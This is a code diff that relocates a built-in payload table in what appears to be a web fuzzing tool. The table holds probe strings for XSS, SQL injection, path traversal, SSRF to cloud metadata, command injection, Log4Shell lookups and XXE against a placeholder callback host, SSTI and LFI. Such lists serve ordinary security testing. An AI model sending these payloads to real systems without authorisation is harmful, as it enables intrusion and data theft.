@@ -57,6 +57,69 @@ import {
   loadPayloadFile as loadPayloadFileLib,
 } from "./_lib/common.ts"
 
+// Built-in payload sets for common vuln classes (declared before dispatch
+// so the lazy `parseOpts → loadPayloadSets` chain can reference them).
+const BUILTIN_PAYLOADS: Record<string, string[]> = {
+  "xss-basic": [
+    `<script>alert(1)</script>`,
+    `"><script>alert(1)</script>`,
+    `'><img src=x onerror=alert(1)>`,
+    `javascript:alert(1)`,
+    `<svg onload=alert(1)>`,
+    `<iframe src="javascript:alert(1)">`,
+    `"><iframe srcdoc="<script>alert(1)</script>">`,
+    `<details open ontoggle=alert(1)>`,
+  ],
+  "sqli-basic": [
+    `'`, `"`, `\\`, `';`, `';--`,
+    `' OR '1'='1`, `' OR 1=1--`, `') OR ('1'='1`,
+    `1' UNION SELECT NULL--`, `1 UNION SELECT NULL,NULL--`,
+    `'; WAITFOR DELAY '0:0:5'--`, `1' AND SLEEP(5)--`,
+    `'||(SELECT 1 FROM dual)||'`, `' AND ASCII(SUBSTRING(@@version,1,1))=77--`,
+  ],
+  "path-traversal": [
+    `../../etc/passwd`, `../../../etc/passwd`, `../../../../etc/passwd`,
+    `..%2f..%2f..%2fetc%2fpasswd`, `..%252f..%252fetc%252fpasswd`,
+    `..\\..\\..\\windows\\win.ini`, `....//....//....//etc/passwd`,
+    `/etc/passwd%00`, `..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
+  ],
+  "ssrf": [
+    `http://127.0.0.1/`, `http://localhost/`,
+    `http://169.254.169.254/latest/meta-data/`,
+    `http://[::1]/`, `http://0.0.0.0/`, `http://0/`,
+    `file:///etc/passwd`, `gopher://127.0.0.1:80/_GET / HTTP/1.0%0d%0a`,
+    `dict://127.0.0.1:11211/stat`,
+  ],
+  "command-injection": [
+    `;id`, `|id`, `\`id\``, `$(id)`, `&&id`, `||id`,
+    `;cat /etc/passwd`, `|cat /etc/passwd`,
+    `; ping -c 1 cc.example.com`,
+    `' || id //`, `" || id //`,
+  ],
+  "open-redirect": [
+    `https://example.com/`, `//example.com/`, `/\\example.com/`,
+    `https:%2f%2fexample.com`, `https:\\\\example.com`,
+    `https://target.com.example.com/`,
+  ],
+  "log4shell": [
+    `\${jndi:ldap://cc.example.com/a}`,
+    `\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://cc.example.com/a}`,
+  ],
+  "xxe": [
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
+    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://cc.example.com/">]><foo>&xxe;</foo>`,
+  ],
+  "ssti": [
+    `{{7*7}}`, `\${{7*7}}`, `<%= 7*7 %>`, `\${7*7}`, `#{7*7}`, `*{7*7}`,
+    `{{config.items()}}`, `{{''.__class__.__mro__[2].__subclasses__()}}`,
+  ],
+  "lfi": [
+    `php://filter/convert.base64-encode/resource=index.php`,
+    `php://filter/read=convert.base64-encode/resource=index.php`,
+    `expect://id`, `data:text/plain,<?php echo \`id\`;?>`,
+  ],
+}
+
 const args = argv.slice(2)
 const json = args.includes("--json")
 
@@ -277,67 +340,8 @@ function loadPayloadSets(): string[][] {
   return sets
 }
 
-// Built-in payload sets for common vuln classes
-const BUILTIN_PAYLOADS: Record<string, string[]> = {
-  "xss-basic": [
-    `<script>alert(1)</script>`,
-    `"><script>alert(1)</script>`,
-    `'><img src=x onerror=alert(1)>`,
-    `javascript:alert(1)`,
-    `<svg onload=alert(1)>`,
-    `<iframe src="javascript:alert(1)">`,
-    `"><iframe srcdoc="<script>alert(1)</script>">`,
-    `<details open ontoggle=alert(1)>`,
-  ],
-  "sqli-basic": [
-    `'`, `"`, `\\`, `';`, `';--`,
-    `' OR '1'='1`, `' OR 1=1--`, `') OR ('1'='1`,
-    `1' UNION SELECT NULL--`, `1 UNION SELECT NULL,NULL--`,
-    `'; WAITFOR DELAY '0:0:5'--`, `1' AND SLEEP(5)--`,
-    `'||(SELECT 1 FROM dual)||'`, `' AND ASCII(SUBSTRING(@@version,1,1))=77--`,
-  ],
-  "path-traversal": [
-    `../../etc/passwd`, `../../../etc/passwd`, `../../../../etc/passwd`,
-    `..%2f..%2f..%2fetc%2fpasswd`, `..%252f..%252fetc%252fpasswd`,
-    `..\\..\\..\\windows\\win.ini`, `....//....//....//etc/passwd`,
-    `/etc/passwd%00`, `..\\..\\..\\..\\..\\windows\\system32\\drivers\\etc\\hosts`,
-  ],
-  "ssrf": [
-    `http://127.0.0.1/`, `http://localhost/`,
-    `http://169.254.169.254/latest/meta-data/`,
-    `http://[::1]/`, `http://0.0.0.0/`, `http://0/`,
-    `file:///etc/passwd`, `gopher://127.0.0.1:80/_GET / HTTP/1.0%0d%0a`,
-    `dict://127.0.0.1:11211/stat`,
-  ],
-  "command-injection": [
-    `;id`, `|id`, `\`id\``, `$(id)`, `&&id`, `||id`,
-    `;cat /etc/passwd`, `|cat /etc/passwd`,
-    `; ping -c 1 cc.example.com`,
-    `' || id //`, `" || id //`,
-  ],
-  "open-redirect": [
-    `https://example.com/`, `//example.com/`, `/\\example.com/`,
-    `https:%2f%2fexample.com`, `https:\\\\example.com`,
-    `https://target.com.example.com/`,
-  ],
-  "log4shell": [
-    `\${jndi:ldap://cc.example.com/a}`,
-    `\${\${::-j}\${::-n}\${::-d}\${::-i}:\${::-l}\${::-d}\${::-a}\${::-p}://cc.example.com/a}`,
-  ],
-  "xxe": [
-    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>`,
-    `<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://cc.example.com/">]><foo>&xxe;</foo>`,
-  ],
-  "ssti": [
-    `{{7*7}}`, `\${{7*7}}`, `<%= 7*7 %>`, `\${7*7}`, `#{7*7}`, `*{7*7}`,
-    `{{config.items()}}`, `{{''.__class__.__mro__[2].__subclasses__()}}`,
-  ],
-  "lfi": [
-    `php://filter/convert.base64-encode/resource=index.php`,
-    `php://filter/read=convert.base64-encode/resource=index.php`,
-    `expect://id`, `data:text/plain,<?php echo \`id\`;?>`,
-  ],
-}
+// (BUILTIN_PAYLOADS is declared near the top of the file so the dispatch
+// can reference it before the rest of the script is parsed.)
 
 function buildMatrix(type: Opts["attackType"], nPos: number, sets: string[][]): string[][] {
   if (type === "sniper") {
